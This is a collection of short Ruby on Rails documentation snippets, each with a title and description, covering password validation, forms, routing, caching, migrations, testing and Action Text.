TITLE: Using SecurePassword Validation and Authentication in Rails
DESCRIPTION: Demonstrates various validation scenarios for secure passwords and shows how to use authenticate methods for both regular and recovery passwords.

LANGUAGE: irb
CODE:
irb> person = Person.new

# When password is blank.
irb> person.valid?
=> false

# When the confirmation doesn't match the password.
irb> person.password = "aditya"
irb> person.password_confirmation = "nomatch"
irb> person.valid?
=> false

# When the length of password exceeds 72.
irb> person.password = person.password_confirmation = "a" * 100
irb> person.valid?
=> false

# When only password is supplied with no password_confirmation.
irb> person.password = "aditya"
irb> person.valid?
=> true

# When all validations are passed.
irb> person.password = person.password_confirmation = "aditya"
irb> person.valid?
=> true

irb> person.recovery_password = "42password"

# `authenticate` is an alias for `authenticate_password`
irb> person.authenticate("aditya")
=> #<Person> # == person
irb> person.authenticate("notright")
=> false
irb> person.authenticate_password("aditya")
=> #<Person> # == person
irb> person.authenticate_password("notright")
=> false

irb> person.authenticate_recovery_password("aditya")
=> false
irb> person.authenticate_recovery_password("42password")
=> #<Person> # == person
irb> person.authenticate_recovery_password("notright")
=> false

irb> person.password_digest
=> "$2a$04$gF8RfZdoXHvyTjHhiU4ZsO.kQqV9oonYZu31PRE4hLQn3xM2qkpIy"
irb> person.recovery_password_digest
=> "$2a$04$iOfhwahFymCs5weB3BNH/uXkTG65HR.qpW.bNhEjFP3ftli3o5DQC"

----------------------------------------

TITLE: Configuring Solid Queue in Development Environment
DESCRIPTION: Sets up Solid Queue as the Active Job adapter in development environment, specifying database connection details for the queue storage.

LANGUAGE: ruby
CODE:
# config/environments/development.rb
config.active_job.queue_adapter = :solid_queue
config.solid_queue.connects_to = { database: { writing: :queue } }

----------------------------------------

TITLE: Defining HTML Safe Translations in YAML
DESCRIPTION: Shows how to define translations that will be marked as HTML safe using the _html suffix or html key in YAML configuration files.

LANGUAGE: yaml
CODE:
# config/locales/en.yml
en:
  welcome: <b>welcome!</b>
  hello_html: <b>hello!</b>
  title:
    html: <b>title!</b>

----------------------------------------

TITLE: Setting Default Locale in Rails I18n
DESCRIPTION: Shows how to set the default locale which is used when no locale is explicitly provided. The default locale is initially set to :en.

LANGUAGE: ruby
CODE:
I18n.default_locale = :de

----------------------------------------

TITLE: Binding Select Box to Model Object in Rails ERB
DESCRIPTION: This snippet demonstrates how to bind a select box to a model attribute using form_with and the select helper. The form is bound to the @person model, and the select box is bound to the city attribute.

LANGUAGE: erb
CODE:
<%= form_with model: @person do |form| %>
  <%= form.select :city, [["Berlin", "BE"], ["Chicago", "CHI"], ["Madrid", "MD"]] %>
<% end %>

----------------------------------------

TITLE: Using try Method for Nil-Safe Method Calls in Ruby on Rails
DESCRIPTION: Examples showing how to use try method to safely call methods on objects that might be nil, avoiding unnecessary conditional statements.

LANGUAGE: ruby
CODE:
# without try
unless @number.nil?
  @number.next
end

# with try
@number.try(:next)

----------------------------------------

TITLE: Broadcasting to a Model-Based Channel in Ruby
DESCRIPTION: Shows how to broadcast to a channel that's subscribed to a specific model instance using the broadcast_to class method.

LANGUAGE: ruby
CODE:
PostsChannel.broadcast_to(@post, @comment)

----------------------------------------

TITLE: Validation with Bi-directional Associations in Rails
DESCRIPTION: Shows how Rails handles validation of presence in associated records. When an association is properly configured, validations work correctly without explicitly defining the inverse relationship.

LANGUAGE: ruby
CODE:
irb> book = Book.new
irb> book.valid?
=> false
irb> book.errors.full_messages
=> ["Author must exist"]
irb> author = Author.new
irb> book = author.books.new
irb> book.valid?
=> true

----------------------------------------

TITLE: Testing Combined Validations in Rails Console
DESCRIPTION: Demonstrates how contextual and standard validations run together when a specific context is triggered. All validations without a context run alongside the context-specific validations.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.valid?(:account_setup)
=> false
irb> person.errors.messages
=> {:email=>["has already been taken"], :age=>["is not a number"], :name=>["can't be blank"]}

----------------------------------------

TITLE: Running Rails Tests on Directories
DESCRIPTION: Shows how to run all tests in a specific directory. This is useful for running all tests of a certain type, such as controller tests.

LANGUAGE: bash
CODE:
$ bin/rails test test/controllers # run all tests from specific directory

----------------------------------------

TITLE: Creating Inline Attachments in Rails Mailers
DESCRIPTION: Ruby method for adding inline attachments to emails in Action Mailer. Inline attachments can be displayed within the body of an HTML email.

LANGUAGE: ruby
CODE:
def welcome
  attachments.inline["image.jpg"] = File.read("/path/to/image.jpg")
end

----------------------------------------

TITLE: HTML Form for Nested Hash Parameters
DESCRIPTION: Example of an HTML form that submits nested hash parameters to a Rails controller. The form includes fields for user data with a nested address structure.

LANGUAGE: html
CODE:
<form accept-charset="UTF-8" action="/users" method="post">
  <input type="text" name="user[name]" value="Acme" />
  <input type="text" name="user[phone]" value="12345" />
  <input type="text" name="user[address][postcode]" value="12345" />
  <input type="text" name="user[address][city]" value="Carrot City" />
</form>

----------------------------------------

TITLE: Mounting an Engine in a Rails Application
DESCRIPTION: Code added to a Rails application's routes file to mount the Blorgh engine at a specified path.

LANGUAGE: ruby
CODE:
mount Blorgh::Engine => "/blorgh"

----------------------------------------

TITLE: Converting Strings to HTML Safe in Ruby
DESCRIPTION: Shows how to mark a string as HTML safe using the html_safe method. This doesn't perform any escaping but marks the string as trusted content.

LANGUAGE: ruby
CODE:
s = "".html_safe
s.html_safe? # => true

----------------------------------------

TITLE: Using collection_radio_buttons Helper in Rails ERB
DESCRIPTION: This snippet demonstrates how to use the collection_radio_buttons helper to generate a set of radio buttons from a collection of objects. It specifies the value method (:id) and text method (:name) for each radio button.

LANGUAGE: erb
CODE:
<%= form.collection_radio_buttons :city_id, City.order(:name), :id, :name %>

----------------------------------------

TITLE: Installing Action Text in Rails
DESCRIPTION: Command sequence for installing Action Text, which provides rich text editing capabilities. Includes running the installer, updating dependencies, and migrating the database.

LANGUAGE: bash
CODE:
$ bin/rails action_text:install
$ bundle install
$ bin/rails db:migrate

----------------------------------------

TITLE: Adding Flash Notice to Layout in Rails
DESCRIPTION: Code to display flash notices in the application layout template.

LANGUAGE: erb
CODE:
<html>
  <!-- ... -->
  <body>
    <div class="notice"><%= notice %></div>
    <!-- ... -->
  </body>
</html>

----------------------------------------

TITLE: Creating Subscribers Controller in Rails
DESCRIPTION: Implementation of a controller to handle creating product subscribers, including unauthenticated access and first_or_create pattern.

LANGUAGE: ruby
CODE:
class SubscribersController < ApplicationController
  allow_unauthenticated_access
  before_action :set_product

  def create
    @product.subscribers.where(subscriber_params).first_or_create
    redirect_to @product, notice: "You are now subscribed."
  end

  private

  def set_product
    @product = Product.find(params[:product_id])
  end

  def subscriber_params
    params.expect(subscriber: [ :email ])
  end
end

----------------------------------------

TITLE: Controller Test with Headers
DESCRIPTION: Shows how to test a controller action with custom HTTP headers.

LANGUAGE: ruby
CODE:
get article_url(Article.first), headers: { "HTTP_REFERER" => "http://example.com/home" }

----------------------------------------

TITLE: Using expect Method for Nested Parameters in Rails
DESCRIPTION: This example demonstrates how to use the expect method to require and permit nested parameters. It ensures that the root key is present and the specified attributes are permitted.

LANGUAGE: ruby
CODE:
user_params = params.expect(user: [:username, :password])
user_params.has_key?(:username) # => true

----------------------------------------

TITLE: Defining Controller Namespaces with namespace in Ruby on Rails
DESCRIPTION: Creates routes for controllers under the Admin:: namespace, creating paths prefixed with /admin. This approach is used for organizing controllers in larger applications.

LANGUAGE: ruby
CODE:
namespace :admin do
  resources :articles
end

----------------------------------------

TITLE: Removing Middleware from Rails Stack
DESCRIPTION: Demonstrates how to completely remove a middleware from the Rails stack. This prevents the middleware from processing requests and responses.

LANGUAGE: ruby
CODE:
config.middleware.delete Rack::MethodOverride

----------------------------------------

TITLE: Generated HTML for Simple Select Boxes
DESCRIPTION: Shows the HTML output generated for a simple select box with city options. Each option has the same value as its display text.

LANGUAGE: html
CODE:
<select name="city" id="city">
  <option value="Berlin">Berlin</option>
  <option value="Chicago">Chicago</option>
  <option value="Madrid">Madrid</option>
</select>

----------------------------------------

TITLE: Using yield in Rails Layouts
DESCRIPTION: Explains how to use yield in Rails layouts to insert content from views. Shows both unnamed (default) yields and named yields for targeted content insertion.

LANGUAGE: html+erb
CODE:
<html>
  <head>
  </head>
  <body>
    <%= yield %>
  </body>
</html>

LANGUAGE: html+erb
CODE:
<html>
  <head>
    <%= yield :head %>
  </head>
  <body>
    <%= yield %>
  </body>
</html>

----------------------------------------

TITLE: Direct Routes with Controller Options in Rails
DESCRIPTION: Shows creating a direct route that returns controller/action options with additional parameters like subdomain. This creates a URL helper that uses url_for internally.

LANGUAGE: ruby
CODE:
direct :main do
  { controller: "pages", action: "index", subdomain: "www" }
end

# >> main_url
# => "http://www.example.com/pages"

----------------------------------------

TITLE: Setting Action Cable Mount Path in Rails Application
DESCRIPTION: Ruby configuration to specify the mount path for Action Cable within a Rails application. This sets the endpoint where WebSocket connections will be established.

LANGUAGE: ruby
CODE:
# config/application.rb
class Application < Rails::Application
  config.action_cable.mount_path = "/websocket"
end

----------------------------------------

TITLE: Basic Low-Level Caching Operations with Rails.cache
DESCRIPTION: This code shows basic low-level caching operations including writing to the cache, reading from the cache, fetching with a default value, and deleting from the cache.

LANGUAGE: ruby
CODE:
# Store a value in the cache
Rails.cache.write("greeting", "Hello, world!")

# Retrieve the value from the cache
greeting = Rails.cache.read("greeting")
puts greeting # Output: Hello, world!

# Fetch a value with a block to set a default if it doesn't exist
welcome_message = Rails.cache.fetch("welcome_message") { "Welcome to Rails!" }
puts welcome_message # Output: Welcome to Rails!

# Delete a value from the cache
Rails.cache.delete("greeting")

----------------------------------------

TITLE: Custom Association Configuration with Foreign Key in Rails
DESCRIPTION: Example of a custom association setup that uses a different name for the association than the actual model name. This configuration uses class_name and foreign_key options which can prevent automatic bi-directional detection.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books
end

class Book < ApplicationRecord
  belongs_to :writer, class_name: "Author", foreign_key: "author_id"
end

----------------------------------------

TITLE: Using Fixtures with Multiple Records in Rails Tests
DESCRIPTION: Demonstrates how to access multiple fixture records in a single Rails test using the fixtures method with symbols as arguments.

LANGUAGE: ruby
CODE:
users(:david, :steve)

----------------------------------------

TITLE: Adding Token Generation to Subscriber Model in Rails
DESCRIPTION: Implements token generation functionality in the Subscriber model using Active Record's generates_token_for feature. This creates unique tokens for unsubscribe links in emails.

LANGUAGE: ruby
CODE:
class Subscriber < ApplicationRecord
  belongs_to :product
  generates_token_for :unsubscribe
end

----------------------------------------

TITLE: Running Database Migration in Rails
DESCRIPTION: Shows the command to run pending database migrations, which applies the changes defined in migration files to the database schema.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Running Database Migrations in a Rails Engine
DESCRIPTION: Executes database migrations to create the blorgh_comments table for the engine.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Implementing controller_path Method in AbstractController
DESCRIPTION: Demonstrates how Rails uses underscore to compute controller paths from controller class names, removing the 'Controller' suffix.

LANGUAGE: ruby
CODE:
def controller_path
  @controller_path ||= name.delete_suffix("Controller").underscore
end

----------------------------------------

TITLE: Setting content type header in Rails response
DESCRIPTION: This snippet demonstrates how to set the content type header in a Rails controller response. This is useful when you need to specify a non-default content type, such as PDF.

LANGUAGE: ruby
CODE:
response.content_type = "application/pdf"

----------------------------------------

TITLE: User and Notification Model with Automatic Creation Callback
DESCRIPTION: Defines a User model with an after_create callback that automatically creates a welcome notification. This demonstrates how callbacks can be used to maintain related records.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_many :notifications

  after_create :create_welcome_notification

  def create_welcome_notification
    notifications.create(event: "sign_up")
  end
end

class Notification < ApplicationRecord
  belongs_to :user
end

----------------------------------------

TITLE: Using time_zone_select Helper in Rails ERB
DESCRIPTION: This snippet demonstrates how to use the time_zone_select helper to render a select box for time zones. It uses the pre-defined ActiveSupport::TimeZone objects.

LANGUAGE: erb
CODE:
<%= form.time_zone_select :time_zone %>

----------------------------------------

TITLE: Testing Eager Loading in Rails with a Dedicated Test
DESCRIPTION: Creates a test that verifies the application can eager load all files without errors, which helps catch loading issues that might only appear in production environments.

LANGUAGE: ruby
CODE:
require "test_helper"

class ZeitwerkComplianceTest < ActiveSupport::TestCase
  test "eager loads all files without errors" do
    assert_nothing_raised { Rails.application.eager_load! }
  end
end

----------------------------------------

TITLE: Implementing JSON Deserialization in a Ruby Class
DESCRIPTION: This snippet shows how to implement the attributes= method to enable JSON deserialization in a Ruby class. It allows setting object attributes from a JSON string using the from_json method.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Serializers::JSON

  attr_accessor :name

  def attributes=(hash)
    hash.each do |key, value|
      public_send("#{key}=", value)
    end
  end

  def attributes
    { "name" => nil }
  end
end

----------------------------------------

TITLE: Deleting Records with destroy Method in Rails
DESCRIPTION: Demonstrates how to use the destroy method to delete a record from the database. The example shows the SQL transaction that occurs when deleting a Product record, including the DELETE statement and transaction management.

LANGUAGE: irb
CODE:
store(dev)> product.destroy
  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/
  Product Destroy (0.4ms)  DELETE FROM "products" WHERE "products"."id" = 1 /*application='Store'*/
  TRANSACTION (0.1ms)  COMMIT TRANSACTION /*application='Store'*/
=> #<Product:0x0000000125813d48 id: 1, name: "T-Shirt", created_at: "2024-11-09 22:39:38.498730000 +0000", updated_at: "2024-11-09 22:39:38.498730000 +0000">

----------------------------------------

TITLE: Finding Records with Composite Primary Keys Using #find
DESCRIPTION: Demonstrates how to use Product.find with an array parameter to locate records by composite primary key values.

LANGUAGE: ruby
CODE:
# Find the product with store_id 3 and sku "XYZ12345"
irb> product = Product.find([3, "XYZ12345"])
=> #<Product store_id: 3, sku: "XYZ12345", description: "Yellow socks">

----------------------------------------

TITLE: Testing Routes with assert_routing in Rails
DESCRIPTION: Shows how to use the assert_routing assertion which combines assert_generates and assert_recognizes to test routes in both directions. Tests that the path generates options and options generate the path.

LANGUAGE: ruby
CODE:
assert_routing({ path: "photos", method: :post }, { controller: "photos", action: "create" })

----------------------------------------

TITLE: Advanced Association Extensions with Proxy Access in Rails
DESCRIPTION: Advanced example showing how to access the association proxy's internal state to create more powerful extension methods that can interact with the owner model.

LANGUAGE: ruby
CODE:
module AdvancedExtension
  def find_and_log(query)
    results = where(query)
    proxy_association.owner.logger.info("Querying #{proxy_association.reflection.name} with #{query}")
    results
  end
end

class Author < ApplicationRecord
  has_many :books, -> { extending AdvancedExtension }
end

----------------------------------------

TITLE: Demonstrating String#tableize Method in Ruby on Rails
DESCRIPTION: Examples showing how tableize combines underscore and pluralize to convert class names to table names, following Rails conventions.

LANGUAGE: ruby
CODE:
"Person".tableize      # => "people"
"Invoice".tableize     # => "invoices"
"InvoiceLine".tableize # => "invoice_lines"

----------------------------------------

TITLE: Custom Omission in String Truncation in Ruby
DESCRIPTION: Shows customizing the omission string when truncating with the :omission option.

LANGUAGE: ruby
CODE:
"Oh dear! Oh dear! I shall be late!".truncate(20, omission: "&hellip;")
# => "Oh dear! Oh &hellip;"

----------------------------------------

TITLE: Implementing Callbacks with Blocks in Ruby on Rails
DESCRIPTION: Shows how to register callbacks using blocks. This approach is useful for short, single-line callback implementations that set username to email when username is blank.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation do
    self.username = email if username.blank?
  end
end

----------------------------------------

TITLE: Using Routing Concerns with Namespace in Rails
DESCRIPTION: Demonstrates applying routing concerns within namespace blocks. This allows for applying the same concerns to resources within specific namespaces.

LANGUAGE: ruby
CODE:
namespace :messages do
  concerns :commentable
end

namespace :articles do
  concerns :commentable
  concerns :image_attachable
end

----------------------------------------

TITLE: Adding Columns with Comments
DESCRIPTION: Migration that adds columns with descriptive comments for MySQL and PostgreSQL databases, which can be viewed in database administration tools.

LANGUAGE: ruby
CODE:
class AddDetailsToProducts < ActiveRecord::Migration[8.1]
  def change
    add_column :products, :price, :decimal, precision: 8, scale: 2, comment: "The price of the product in USD"
    add_column :products, :stock_quantity, :integer, comment: "The current stock quantity of the product"
  end
end

----------------------------------------

TITLE: Generating an Add Column Migration in Rails
DESCRIPTION: This command generates a migration to add a part_number column to the products table. The generator interprets the AddXXXToYYY naming pattern.

LANGUAGE: bash
CODE:
$ bin/rails generate migration AddPartNumberToProducts part_number:string

----------------------------------------

TITLE: Creating NOT Conditions in ActiveRecord Queries
DESCRIPTION: Shows how to build SQL NOT queries using where.not to exclude specific records from query results.

LANGUAGE: ruby
CODE:
Customer.where.not(orders_count: [1, 3, 5])

----------------------------------------

TITLE: Testing Error Handling with assert_raises
DESCRIPTION: Demonstrates how to test for expected exceptions using the assert_raises method, which allows verifying that specific errors are raised.

LANGUAGE: ruby
CODE:
test "should report error" do
  # some_undefined_variable is not defined elsewhere in the test case
  assert_raises(NameError) do
    some_undefined_variable
  end
end

----------------------------------------

TITLE: Finding a Record by ID in Rails
DESCRIPTION: Using the find method to retrieve a specific product by its ID. This generates a SQL query with a WHERE clause for the id column and LIMIT 1.

LANGUAGE: irb
CODE:
store(dev)> Product.find(1)
  Product Load (0.2ms)  SELECT "products".* FROM "products" WHERE "products"."id" = 1 LIMIT 1 /*application='Store'*/
=> #<Product:0x000000012054af08 id: 1, name: "T-Shirt", created_at: "2024-11-09 16:35:01.117836000 +0000", updated_at: "2024-11-09 16:35:01.117836000 +0000">

----------------------------------------

TITLE: Running Tests in Rails Plugin
DESCRIPTION: Bash command to run the test suite for the Rails plugin, showing successful test results with 6 runs, 6 assertions, and no failures or errors.

LANGUAGE: bash
CODE:
$ bin/test
...
6 runs, 6 assertions, 0 failures, 0 errors, 0 skips

----------------------------------------

TITLE: Adding Audio Elements with audio_tag in Rails
DESCRIPTION: Demonstrates how to use the audio_tag helper to insert HTML5 audio elements into Rails views, including specifying paths and HTML5 audio options.

LANGUAGE: erb
CODE:
<%= audio_tag "music.mp3" %>

LANGUAGE: erb
CODE:
<%= audio_tag "music/first_song.mp3" %>

----------------------------------------

TITLE: Setting Custom Flash Keys in Rails Redirects
DESCRIPTION: Demonstrates setting a custom flash key in a redirect. This example uses a boolean flash key that can be used for conditional rendering in the view.

LANGUAGE: ruby
CODE:
redirect_to root_url, flash: { just_signed_up: true }

----------------------------------------

TITLE: Permitting Nested Attributes Parameters in Rails Controller
DESCRIPTION: Shows how to configure strong parameters to allow nested attributes in a Rails controller. This is essential for mass assignment security when working with nested forms.

LANGUAGE: ruby
CODE:
def create
  @person = Person.new(person_params)
  # ...
end

private
  def person_params
    params.expect(person: [ :name, addresses_attributes: [[ :id, :kind, :street ]] ])
  end

----------------------------------------

TITLE: Displaying Flash Messages in a Rails Layout
DESCRIPTION: ERB code for a layout that displays all flash messages. This implementation iterates through all flash messages and renders each with appropriate styling based on the message type.

LANGUAGE: erb
CODE:
<html>
  <!-- <head/> -->
  <body>
    <% flash.each do |name, msg| -%>
      <%= content_tag :div, msg, class: name %>
    <% end -%>

    <!-- more content -->
    <%= yield %>
  </body>
</html>

----------------------------------------

TITLE: Setting Up Singular Resources for Use with form_with
DESCRIPTION: Demonstrates how to configure a singular resource in Rails routes and resolve helpers for it to work properly with form_with record identification.

LANGUAGE: ruby
CODE:
resource :article
resolve("Article") { [:article] }

----------------------------------------

TITLE: Checking if Model Name is Uncountable in Rails
DESCRIPTION: Demonstrates the model_name.uncountable? method which identifies whether the class name is uncountable in English grammar rules.

LANGUAGE: irb
CODE:
irb> Person.model_name.uncountable?
=> false

----------------------------------------

TITLE: Overriding to_param in Rails Models for Custom URL Construction
DESCRIPTION: Demonstrates how to override the to_param method in ActiveRecord models to use a custom identifier for URL construction. This allows for more readable or SEO-friendly URLs.

LANGUAGE: ruby
CODE:
class Video < ApplicationRecord
  def to_param
    identifier
  end
end

----------------------------------------

TITLE: Creating a Table with Composite Primary Key
DESCRIPTION: Migration that creates a users table with a composite primary key consisting of both id and name columns.

LANGUAGE: ruby
CODE:
class CreateUsers < ActiveRecord::Migration[8.1]
  def change
    create_table :users, primary_key: [:id, :name] do |t|
      t.string :name
      t.string :email
      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Using collection_select Helper in Rails ERB
DESCRIPTION: This snippet demonstrates how to use the collection_select helper to create a select box from a collection of objects. It specifies the value method (:id) and text method (:name) to use for each option.

LANGUAGE: erb
CODE:
<%= form.collection_select :city_id, City.order(:name), :id, :name %>

----------------------------------------

TITLE: Truncating Strings by Bytes in Ruby
DESCRIPTION: Demonstrates truncating strings based on byte size rather than character count, which is important for multi-byte characters like emoji.

LANGUAGE: ruby
CODE:
"ðððð".truncate_bytes(15)
# => "ðððâ¦"

----------------------------------------

TITLE: Manually Including Assets in Specific Order in ERB Layout
DESCRIPTION: Example showing how to manually include CSS and JavaScript files in a specific order within an HTML layout file to manage dependencies without automated dependency management.

LANGUAGE: erb
CODE:
<!-- application.html.erb -->
<head>
 <%= stylesheet_link_tag "reset" %>
 <%= stylesheet_link_tag "base" %>
 <%= stylesheet_link_tag "main" %>
</head>
<body>
 <%= javascript_include_tag "utilities" %>
 <%= javascript_include_tag "main" %>
</body>

----------------------------------------

TITLE: HTML Markup for Client-Side Attachment Insertion
DESCRIPTION: HTML tag format for inserting an attachable into rich text content using its sgid on the client side.

LANGUAGE: html
CODE:
<action-text-attachment sgid="BAh7CEkiCGâ¦"></action-text-attachment>

----------------------------------------

TITLE: Creating a Table with Database-specific Options
DESCRIPTION: Migration that creates a table with database-specific options using the options parameter, in this case specifying MySQL engine type.

LANGUAGE: ruby
CODE:
create_table :products, options: "ENGINE=BLACKHOLE" do |t|
  t.string :name, null: false
end

----------------------------------------

TITLE: Shorthand Syntax for Rendering Rails Partials
DESCRIPTION: Demonstrates simplified syntax for rendering partials without explicitly specifying 'partial' and 'locals' keys when they're the only options needed.

LANGUAGE: erb
CODE:
<%= render partial: "product", locals: { product: @product } %>

LANGUAGE: erb
CODE:
<%= render "product", product: @product %>

LANGUAGE: erb
CODE:
<%= render @product %>

----------------------------------------

TITLE: Using Flash Messages with Session Logout in Rails
DESCRIPTION: Enhanced SessionsController destroy action that adds a flash message to inform the user about the successful logout. This demonstrates how to add user feedback during redirects.

LANGUAGE: ruby
CODE:
class SessionsController < ApplicationController
  def destroy
    session.delete(:current_user_id)
    flash[:notice] = "You have successfully logged out."
    redirect_to root_url, status: :see_other
  end
end

----------------------------------------

TITLE: Configuring ActiveStorage Previewers in Rails
DESCRIPTION: Specifies the previewer classes available for generating thumbnails from different file types. This includes previewers for PDF files and videos.

LANGUAGE: ruby
CODE:
config.active_storage.previewers = [ActiveStorage::Previewer::PopplerPDFPreviewer, ActiveStorage::Previewer::MuPDFPreviewer, ActiveStorage::Previewer::VideoPreviewer]

----------------------------------------

TITLE: Constraining Routes to Multiple HTTP Verbs in Rails
DESCRIPTION: Uses the match method with the :via option to create a route that responds to multiple HTTP verbs. This allows a single route to handle different types of requests.

LANGUAGE: ruby
CODE:
match "photos", to: "photos#show", via: [:get, :post]

----------------------------------------

TITLE: Configuring Log Level in Rails Applications
DESCRIPTION: Shows how to change the default log level in a Rails application, either in an environment initializer or at runtime, to control the verbosity of logging output.

LANGUAGE: ruby
CODE:
config.log_level = :warn # In any environment initializer, or
Rails.logger.level = 0 # at any time

----------------------------------------

TITLE: Testing Action Cable Channel with User-specific Streams in Rails
DESCRIPTION: An example of testing a channel that streams notifications for a specific user. This test stubs the connection with a current_user and verifies that the appropriate user-specific stream is established.

LANGUAGE: ruby
CODE:
require "test_helper"

class WebNotificationsChannelTest < ActionCable::Channel::TestCase
  test "subscribes and stream for user" do
    stub_connection current_user: users(:john)

    subscribe

    assert_has_stream_for users(:john)
  end
end

----------------------------------------

TITLE: Defining a Custom Key Provider Class for Encryption
DESCRIPTION: Implements the required interface for a custom encryption key provider. A key provider must provide methods for returning encryption and decryption keys.

LANGUAGE: ruby
CODE:
class MyKeyProvider
  def encryption_key
  end

  def decryption_keys(encrypted_message)
  end
end

----------------------------------------

TITLE: Setting Default URL Options for Locale in Rails
DESCRIPTION: Implementation of default_url_options to automatically include the current locale in all URL helpers. This ensures locale is preserved between requests without manual URL construction.

LANGUAGE: ruby
CODE:
# app/controllers/application_controller.rb
def default_url_options
  { locale: I18n.locale }
end

----------------------------------------

TITLE: Testing View Helpers in Rails with ActionView::TestCase
DESCRIPTION: Shows how to test a view helper in Rails using ActionView::TestCase. This example tests that the link_to_user helper correctly generates a link with the user's full name.

LANGUAGE: ruby
CODE:
class UsersHelperTest < ActionView::TestCase
  test "should return the user's full name" do
    user = users(:david)

    assert_dom_equal %{<a href="/user/#{user.id}">David Heinemeier Hansson</a>}, link_to_user(user)
  end
end

----------------------------------------

TITLE: Limiting PostgreSQL Prepared Statements in Rails
DESCRIPTION: This configuration demonstrates how to limit the number of prepared statements per database connection for PostgreSQL to control memory usage. By default, Active Record creates up to 1000 statements.

LANGUAGE: yaml
CODE:
production:
  adapter: postgresql
  statement_limit: 200

----------------------------------------

TITLE: Deep Duplication of Hashes in Ruby on Rails
DESCRIPTION: Demonstrates how to create a complete deep copy of a hash and all its nested elements using the deep_dup method, ensuring that modifying the copy doesn't affect the original hash structure.

LANGUAGE: ruby
CODE:
hash = { a: 1, b: { c: 2, d: [3, 4] } }

dup = hash.deep_dup
dup[:b][:e] = 5
dup[:b][:d] << 5

hash[:b][:e] == nil      # => true
hash[:b][:d] == [3, 4]   # => true

----------------------------------------

TITLE: Creating Forms for External Resources with Authentication
DESCRIPTION: Shows how to use form_with to create a form that posts to an external API, passing an authenticity token expected by the external resource.

LANGUAGE: erb
CODE:
<%= form_with url: 'http://farfar.away/form', authenticity_token: 'external_token' do %>
  Form contents
<% end %>

----------------------------------------

TITLE: Adding Custom Error Messages to Test Assertions
DESCRIPTION: Shows how to add a custom error message to an assertion to make test failures more descriptive and easier to understand.

LANGUAGE: ruby
CODE:
test "should not save article without title" do
  article = Article.new
  assert_not article.save, "Saved the article without a title"
end

----------------------------------------

TITLE: Multiple Validator Classes with Options in Rails
DESCRIPTION: This example shows how to pass options to validator classes. The AddressValidator receives a list of fields to validate, making it more flexible and reusable across different models.

LANGUAGE: ruby
CODE:
class AddressValidator < ActiveModel::Validator
  def validate(record)
    options[:fields].each do |field|
      if record.send(field).blank?
        record.errors.add field, "is required"
      end
    end
  end
end

class Invoice < ApplicationRecord
  validates_with AddressValidator, fields: [:house_number, :street, :postcode, :country]
end

----------------------------------------

TITLE: Variable Renaming with Pattern Matching in Rails Partials
DESCRIPTION: Shows how to use Ruby's pattern matching assignment to rename variables when destructuring local_assigns in a Rails partial.

LANGUAGE: ruby
CODE:
local_assigns => { product: record }
product             # => "#<Product:0x0000000109ec5d10>"
record              # => "#<Product:0x0000000109ec5d10>"
product == record   # => true

----------------------------------------

TITLE: Including JavaScript Module in Layout
DESCRIPTION: Showing how to include a JavaScript module in an HTML layout using the type="module" attribute to support ES6 module syntax.

LANGUAGE: html
CODE:
<script type="module" src="main.js"></script>

----------------------------------------

TITLE: Testing Views with Ruby Pattern Matching
DESCRIPTION: Example of using Ruby's Pattern Matching with document_root_element for advanced view testing with Nokogiri 1.14.0+ and minitest 5.18.0+.

LANGUAGE: ruby
CODE:
test "renders a link to itself" do
  article = Article.create! title: "Hello, world"

  render "articles/article", article: article
  anchor = document_root_element.at("a")
  url = article_url(article)

  assert_pattern do
    anchor => { content: "Hello, world", attributes: [{ name: "href", value: url }] }
  end
end

----------------------------------------

TITLE: Creating Parametric Scopes in Rails Routes
DESCRIPTION: Demonstrates how to prefix routes with a named parameter that becomes available as params[:account_id] in controllers. This creates nested-style routes without a full nesting structure.

LANGUAGE: ruby
CODE:
scope ":account_id", as: "account", constraints: { account_id: /\d+/ } do
  resources :articles
end

----------------------------------------

TITLE: Rendered HTML Output of Action Text with User Attachment
DESCRIPTION: Final HTML output after Action Text renders content with an embedded User attachment.

LANGUAGE: html
CODE:
<p>Hello, <action-text-attachment sgid="BAh7CEkiCGâ¦"><span><img src="..."> Jane Doe</span></action-text-attachment>.</p>

----------------------------------------

TITLE: Customizing Rich Text Content Container
DESCRIPTION: ERB template for customizing the HTML container that wraps rich text content, allowing styling adjustments to the rendered output.

LANGUAGE: html+erb
CODE:
<%# app/views/layouts/action_text/contents/_content.html.erb %>
<div class="trix-content">
  <%= yield %>
</div>

----------------------------------------

TITLE: Rendering Inline Builder XML from a Controller
DESCRIPTION: Using the :inline option with the :type option to render Builder XML content directly from a controller, which is also generally discouraged.

LANGUAGE: ruby
CODE:
render inline: "xml.p {'Horrid coding practice!'}", type: :builder

----------------------------------------

TITLE: Selecting Specific Fields in ActiveRecord Query
DESCRIPTION: Demonstrates how to use the 'select' method to specify which columns to retrieve from the database, returning only the requested fields in the result set.

LANGUAGE: ruby
CODE:
Book.select("isbn, out_of_print")

LANGUAGE: sql
CODE:
SELECT isbn, out_of_print FROM books

----------------------------------------

TITLE: Configuring Per-attribute Encryption Schemes in Rails
DESCRIPTION: Configures a previous encryption scheme for a specific attribute using the :previous option when declaring an encrypted attribute. This example shows changing a deterministic attribute's previous configuration.

LANGUAGE: ruby
CODE:
class Article
  encrypts :title, deterministic: true, previous: { deterministic: false }
end

----------------------------------------

TITLE: Creating a Custom Form Helper for a FormBuilder
DESCRIPTION: Defines a helper method that automatically uses a custom FormBuilder. This labeled_form_with helper wraps form_with and sets the builder option to LabellingFormBuilder, making forms with labels easier to create.

LANGUAGE: ruby
CODE:
module ApplicationHelper
  def labeled_form_with(**options, &block)
    options[:builder] = LabellingFormBuilder
    form_with(**options, &block)
  end
end

----------------------------------------

TITLE: Loading Specific Core Extensions in Ruby on Rails
DESCRIPTION: How to selectively load a specific core extension like hash indifferent access by requiring the specific file.

LANGUAGE: ruby
CODE:
require "active_support"
require "active_support/core_ext/hash/indifferent_access"

----------------------------------------

TITLE: Updating Records Using Update Method in Rails
